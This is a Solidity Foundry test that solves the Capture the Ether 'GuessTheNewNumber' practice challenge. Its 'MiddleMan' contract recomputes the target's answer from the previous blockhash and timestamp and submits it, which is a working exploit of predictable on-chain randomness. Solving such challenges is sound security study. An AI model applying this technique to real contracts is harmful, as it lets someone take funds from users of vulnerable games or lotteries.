pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/GuessTheNewNumber.sol";

contract MiddleMan {
    function attack(address prey) public {
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        GuessTheNewNumber(prey).guess(answer);
    }
}

contract GuessTheNewNumberTest is Test {
    GuessTheNewNumber instance;

    function setUp() public {
        instance = new GuessTheNewNumber();
    }

    function test() public {
        assertFalse(instance.isComplete());

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack(address(instance));

        assertTrue(instance.isComplete());
    }
}
